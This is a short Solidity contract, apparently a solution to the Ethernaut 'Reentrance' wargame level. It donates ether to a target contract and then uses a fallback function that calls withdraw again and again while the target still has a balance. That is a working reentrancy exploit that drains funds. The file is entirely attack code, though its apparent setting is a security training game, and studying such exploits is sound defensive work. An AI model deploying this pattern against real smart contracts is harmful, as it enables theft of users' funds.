// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Reentrance.sol';

contract EthernautReentrancyAttack {
    Reentrance target;
    uint public amount = 1 ether;

    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
    }

    function donateToTarget() public {
        target.donate{value: amount, gas: 4000000}(address(this));
    }

    fallback() external payable {
        if (address(target).balance != 0) {
            target.withdraw(amount);
        }
    }


}